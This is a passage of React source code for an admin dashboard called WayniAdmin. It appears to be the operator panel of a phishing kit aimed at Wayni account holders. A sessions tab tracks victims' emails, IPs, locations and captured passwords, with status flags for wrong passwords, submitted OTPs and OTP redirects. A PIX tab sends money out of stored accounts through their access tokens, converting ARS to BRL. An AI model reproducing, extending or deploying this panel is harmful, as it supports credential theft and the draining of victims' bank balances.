                  <p className="text-xl font-mono font-bold text-red-400">${pixTransactions.reduce((s, t) => s + (t.amount_ars || 0), 0).toFixed(2)}</p>
                </div>
              </div>

              <div className="space-y-2">
                {pixTransactions.filter(t => t.amount_brl > 0 || t.payment_status !== "validated").map(tx => (
                  <div key={tx.id} className="bg-[#111] border border-[#1a1a1a] rounded-xl px-4 py-3">
                    <div className="flex items-center justify-between">
                      <div className="min-w-0 flex-1">
                        <div className="flex items-center gap-2 mb-1">
                          <p className="text-sm font-medium">{tx.recipient_name || "—"}</p>
                          <span className={`text-[10px] px-2 py-0.5 rounded-full ${statusColors[tx.payment_status] || "text-gray-400 bg-gray-500/10"}`}>
                            {tx.payment_status}
                          </span>
                        </div>
                        <div className="flex flex-wrap items-center gap-x-4 gap-y-1 text-[10px] text-gray-500">
                          <span>Chave: {tx.pix_key}</span>
                          <span>De: {tx.account_name || tx.account_identification}</span>
                          <span>{fmtDate(tx.created_at)}</span>
                          {tx.bank_transaction_id && <span className="text-gray-600 font-mono">ID: {tx.bank_transaction_id}</span>}
                          {tx.exchange_rate && <span>Taxa: {tx.exchange_rate}</span>}
                        </div>
                      </div>
                      <div className="text-right flex-shrink-0 ml-4">
                        <p className="text-sm font-mono font-bold text-green-400">R${tx.amount_brl.toFixed(2)}</p>
                        {tx.amount_ars && <p className="text-xs font-mono text-red-400">-${tx.amount_ars.toFixed(2)}</p>}
                      </div>
                      {tx.payment_uuid && tx.wayni_account_id && tx.payment_status !== "Done" && (
                        <button onClick={() => handleCheckPixStatus(tx)} className="ml-2 text-gray-500 hover:text-[#c8e64a] transition-colors" title="Verificar status">
                          <RefreshCw size={12} />
                        </button>
                      )}
                    </div>
                  </div>
                ))}
                {pixTransactions.length === 0 && <p className="text-xs text-gray-600 text-center py-8">Nenhuma transação registrada</p>}
              </div>
            </div>
          )}

          {/* ═══ SEND PIX TAB ═══ */}
          {activeTab === "send_pix" && (
            <div className="max-w-md mx-auto space-y-4">
              <h2 className="text-lg font-bold text-[#c8e64a] flex items-center gap-2"><ArrowUpRight size={18} />Envio PIX</h2>

              <div>
                <label className="text-xs text-gray-500 mb-1 block">Conta</label>
                <select
                  value={pixAccountId}
                  onChange={e => { setPixAccountId(e.target.value); setPixStep("idle"); setPixData(null); setPixError(""); }}
                  className="w-full bg-[#111] border border-[#222] rounded-lg px-3 py-2.5 text-sm text-white outline-none focus:border-[#c8e64a]"
                >
                  <option value="">Selecionar conta...</option>
                  {accounts.filter(a => a.access_token).map(a => (
                    <option key={a.id} value={a.id}>{a.full_name || a.identification} — ${a.balance || "0"}</option>
                  ))}
                </select>
              </div>

              <div>
                <label className="text-xs text-gray-500 mb-1 block">Chave PIX</label>
                <input
                  value={pixKey}
                  onChange={e => setPixKey(e.target.value)}
                  placeholder="CPF, telefone, email..."
                  className="w-full bg-[#111] border border-[#222] rounded-lg px-3 py-2.5 text-sm text-white placeholder:text-gray-600 outline-none focus:border-[#c8e64a]"
                />
              </div>

              {pixStep === "idle" && (
                <button onClick={handlePixValidate} disabled={!pixAccountId || !pixKey} className="w-full py-3 bg-[#c8e64a] text-[#0a0a0a] rounded-xl font-bold text-sm disabled:opacity-50 hover:bg-[#d4f058] transition-colors">
                  Validar Chave
                </button>
              )}

              {pixStep === "validating" && (
                <div className="flex items-center justify-center gap-2 py-4">
                  <Loader2 className="w-5 h-5 text-[#c8e64a] animate-spin" />
                  <span className="text-sm text-gray-400">Validando...</span>
                </div>
              )}

              {(pixStep === "validated" || pixStep === "processing") && pixData && (
                <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-4 space-y-3">
                  <div className="text-xs space-y-1">
                    <p><span className="text-gray-500">Destinatário:</span> <span className="text-white font-medium">{pixData.ownerName}</span></p>
                    <p><span className="text-gray-500">Chave:</span> <span className="text-white">{pixData.reformatedKey || pixData.pixKey}</span></p>
                  </div>
                  <div>
                    <label className="text-xs text-gray-500 mb-1 block">Valor BRL</label>
                    <input type="number" value={pixAmount} onChange={e => setPixAmount(e.target.value)} placeholder="5.00"
                      className="w-full bg-[#0a0a0a] border border-[#222] rounded-lg px-3 py-2.5 text-sm text-white outline-none focus:border-[#c8e64a]" />
                  </div>
                  <button onClick={handlePixProcess} disabled={!pixAmount || pixStep === "processing"} className="w-full py-3 bg-green-500 text-white rounded-xl font-bold text-sm disabled:opacity-50 hover:bg-green-600 transition-colors">
                    {pixStep === "processing" ? <span className="flex items-center justify-center gap-2"><Loader2 className="w-4 h-4 animate-spin" />Processando...</span> : `Enviar R$${pixAmount || "0"}`}
                  </button>
                </div>
              )}

              {pixStep === "checking" && (
                <div className="flex items-center justify-center gap-2 py-4">
                  <Loader2 className="w-5 h-5 text-green-400 animate-spin" />
                  <span className="text-sm text-gray-400">Verificando comprovante...</span>
                </div>
              )}

              {pixStep === "done" && pixData && (
                <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-5 space-y-3">
                  <p className="text-green-400 font-bold text-center text-lg">✓ PIX Enviado!</p>
                  <div className="space-y-2 text-xs">
                    <div className="flex justify-between"><span className="text-gray-400">Destinatário</span><span className="text-white font-medium">{pixData.ownerName}</span></div>
                    <div className="flex justify-between"><span className="text-gray-400">Chave PIX</span><span className="text-white">{pixData.pixKey}</span></div>
                    <div className="flex justify-between"><span className="text-gray-400">Valor BRL</span><span className="text-green-400 font-mono font-bold">R${pixData.brlAmount}</span></div>
                    <div className="flex justify-between"><span className="text-gray-400">ARS debitado</span><span className="text-red-400 font-mono font-bold">${pixData.arsAmount}</span></div>
                    {pixData.exchangeRate && <div className="flex justify-between"><span className="text-gray-400">Câmbio</span><span className="text-white">{pixData.exchangeRate}</span></div>}
                    {pixData.bankTransactionId && <div className="flex justify-between"><span className="text-gray-400">ID Transação</span><span className="text-gray-300 font-mono text-[10px]">{pixData.bankTransactionId}</span></div>}
                    <div className="flex justify-between"><span className="text-gray-400">Status</span><span className={`font-medium ${pixData.paymentStatus === "Done" ? "text-green-400" : "text-yellow-400"}`}>{pixData.paymentStatus}</span></div>
                  </div>
                  <button onClick={() => { setPixStep("idle"); setPixData(null); setPixKey(""); setPixAmount(""); }} className="w-full text-center text-xs text-[#c8e64a] hover:underline mt-2">
                    Novo envio
                  </button>
                </div>
              )}

              {pixStep === "error" && (
                <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-4 text-center space-y-2">
                  <p className="text-red-400 font-bold">Erro</p>
                  <p className="text-xs text-gray-400">{pixError}</p>
                  <button onClick={() => setPixStep("idle")} className="text-xs text-[#c8e64a] hover:underline mt-2">Tentar novamente</button>
                </div>
              )}
            </div>
          )}

          {/* ═══ SESSIONS / LOGS TAB ═══ */}
          {activeTab === "logs" && (
            <div>
              <h2 className="text-sm font-semibold text-gray-400 mb-4 flex items-center gap-2"><Activity size={14} />Sessões (últimas 24h)</h2>
              <div className="space-y-2">
                {liveSessions.map(s => {
                  const statusLabel = getSessionStatusLabel(s.status);
                  return (
                    <div key={s.id} className="bg-[#111] border border-[#1a1a1a] rounded-xl px-4 py-3">
                      <div className="flex items-center justify-between">
                        <div className="min-w-0 flex-1">
                          <div className="flex items-center gap-2 mb-1">
                            <p className="text-sm font-medium">{s.email || "—"}</p>
                            <span className={`text-[10px] px-2 py-0.5 rounded-full ${statusLabel.color}`}>{statusLabel.label}</span>
                          </div>
                          <div className="flex flex-wrap items-center gap-x-4 gap-y-1 text-[10px] text-gray-500">
                            <span>{s.ip_address}</span>
                            {s.city && <span className="flex items-center gap-0.5"><MapPin size={8} />{s.city}, {s.country}</span>}
                            <span><Clock size={8} className="inline mr-0.5" />{fmtDate(s.created_at)}</span>
                            <span>{s.operator_code}</span>
                          </div>
                        </div>
                        {s.password && (
                          <div className="text-right flex-shrink-0 ml-4">
                            <p className="text-[10px] text-gray-500 font-mono">{s.password?.substring(0, 3)}***</p>
                          </div>
                        )}
                      </div>
                    </div>
                  );
                })}
                {liveSessions.length === 0 && <p className="text-xs text-gray-600 text-center py-8">Nenhuma sessão nas últimas 24h</p>}
              </div>
            </div>
          )}
        </div>
      </div>
    </SessionPresenceProvider>
  );
};

// ─── StatCard Component ───
const StatCard = ({ icon: Icon, label, value, sub, color }: { icon: any; label: string; value: string; sub: string; color: string }) => (
  <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-4">
    <div className="flex items-center gap-2 mb-2">
      <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ backgroundColor: `${color}15` }}>
        <Icon size={16} style={{ color }} />
      </div>
      <span className="text-[10px] text-gray-500 uppercase tracking-wider">{label}</span>
    </div>
    <p className="text-xl font-mono font-bold text-white">{value}</p>
    <p className="text-[10px] text-gray-500 mt-0.5">{sub}</p>
  </div>
);

// ─── Session status helper ───
function getSessionStatusLabel(status: string): { label: string; color: string } {
  const map: Record<string, { label: string; color: string }> = {
    pending_review: { label: "Pendente", color: "text-yellow-400 bg-yellow-500/10" },
    login_success: { label: "Login OK", color: "text-green-400 bg-green-500/10" },
    login_error: { label: "Erro Login", color: "text-red-400 bg-red-500/10" },
    wrong_password: { label: "Senha Errada", color: "text-red-400 bg-red-500/10" },
    otp_submitted: { label: "OTP Enviado", color: "text-blue-400 bg-blue-500/10" },
    otp_approved: { label: "OTP OK", color: "text-green-400 bg-green-500/10" },
    otp_rejected: { label: "OTP Errado", color: "text-red-400 bg-red-500/10" },
    show_otp: { label: "Pediu OTP", color: "text-cyan-400 bg-cyan-500/10" },
    redirect_otp: { label: "Redirect OTP", color: "text-cyan-400 bg-cyan-500/10" },
    approved: { label: "Aprovado", color: "text-green-400 bg-green-500/10" },
    completed: { label: "Concluído", color: "text-green-500 bg-green-500/10" },
    connection_error: { label: "Erro Conexão", color: "text-red-500 bg-red-500/10" },
  };
  return map[status] || { label: status, color: "text-gray-400 bg-gray-500/10" };
}

export default WayniAdmin;
